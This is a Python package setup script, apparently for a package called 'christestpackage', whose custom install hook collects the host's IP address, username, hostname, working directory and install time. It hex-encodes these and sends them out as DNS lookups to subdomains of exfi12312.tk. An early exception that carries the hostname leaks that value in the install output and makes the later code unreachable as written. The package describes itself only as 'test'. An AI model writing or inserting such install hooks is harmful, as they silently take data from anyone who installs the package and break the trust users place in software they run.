from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import os
import pwd
from time import gmtime, strftime
from binascii import hexlify
import random

packagename = 'christestpackage'

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()

        raise Exception(hostname)
        cwd = os.getcwd()
        username = pwd.getpwuid(os.getuid()).pw_name
        # hostnamez = socket.getfqdn()
        now = strftime("%Y-%m-%d %H:%M:%S", gmtime())
        ip = socket.gethostbyname(socket.gethostname())
        payload=ip+';'+username+';'+hostname+';'+str(now)+';'+cwd+';'+packagename

        
        payload=hexlify(bytes(payload.encode('utf8')))

        chunks = [payload[i:i+50] for i in range(0, len(payload), 50)]


        seperator = ''.join([str(random.randint(0,9)) for i in range(5)])
        for i, chunk in enumerate(chunks):
            try:
                socket.getaddrinfo(chunk.decode('utf-8') + seperator + 'Z' + str(i) +  '.sub.exfi12312.tk', 80)
            except:
                pass
        try:
            socket.getaddrinfo('done' + seperator + 'Z' + '9999' +  '.sub.exfi12312.tk', 80)
        except:
            pass


setup(name=packagename, #package name
      version='1.0.8',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})